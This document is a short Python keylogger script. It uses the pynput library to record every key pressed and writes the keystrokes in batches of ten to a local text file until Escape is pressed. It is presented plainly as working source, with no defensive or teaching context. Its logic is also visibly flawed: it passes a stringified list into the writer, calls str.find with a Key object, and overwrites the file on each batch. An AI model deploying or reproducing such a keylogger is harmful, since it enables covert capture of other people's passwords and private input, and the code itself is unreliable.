import pynput
from pynput.keyboard import Key, Listener

keys = []
count = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(str(keys))
        keys = []


def write_file(keys):
    with open('key_input.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find(Key.space) > 0:
                f.write('\n')
            else:
                f.write(k)



def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



